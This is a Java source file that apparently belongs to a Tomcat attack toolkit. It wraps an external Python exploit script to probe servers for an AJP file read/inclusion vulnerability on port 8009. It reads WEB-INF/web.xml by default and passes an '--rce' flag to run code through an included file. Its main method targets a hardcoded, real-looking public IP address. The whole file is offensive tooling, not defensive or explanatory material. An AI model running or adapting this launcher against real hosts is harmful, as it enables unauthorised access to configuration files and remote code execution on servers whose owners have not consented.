package Controller;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public class AJPVul {
    private String path;
    private String ip;
    private String port;
    private int isRCE = 0;

    public AJPVul(String path,String ip,String port){
        this.ip = ip;
        if (path.isEmpty()){
            this.path = "WEB-INF/web.xml";
        } else {
            this.path = path;
            this.isRCE = 1;
        }
        if (port.isEmpty()){
            this.port  = "8009";
        } else {
            this.port = port;
        }
    }
    public String outResult(){
        String ajpVulPath = System.getProperty("user.dir")+"/config/ajpVul.py";
        //        String ajpVulPath = "E:\\Tools\\工具开发\\JAVA\\TomcatPass\\target\\config\\ajpVul.py";
        System.out.println(ajpVulPath);
        if (!new File(ajpVulPath).exists()){
            return "[!] config配置文件错误-无ajpVul.py文件，请重新下载";
        }
        String cmd = "python "+ajpVulPath+" "+this.ip+" -p "+this.port+" -f "+this.path;
        if (this.isRCE==1){
            cmd = cmd+" --rce RCE";
        }
        System.out.println(cmd);
        BufferedReader br = null;
        try {
            Process p =Runtime.getRuntime().exec(cmd);
            br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = null;
            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }
            System.out.println(sb);
            if (sb.toString().contains("hissec")){
                if (isRCE==1){
                    return sb.toString();
                }
                return "[++] 存在漏洞，可通过包含上传的文件执行代码。";
            } else {
                return "[-] 不存在AJP文件读取/包含漏洞";
            }
        } catch (IOException e) {
            return "except：可尝试直接运行config/ajpVul检测漏洞！";
        } finally {
            if (br != null)
            {
                try {
                    br.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static void main(String[] args) {
        AJPVul ajpVul = new AJPVul("test.txt","113.57.109.166","");
        System.out.println(ajpVul.outResult());
    }
}
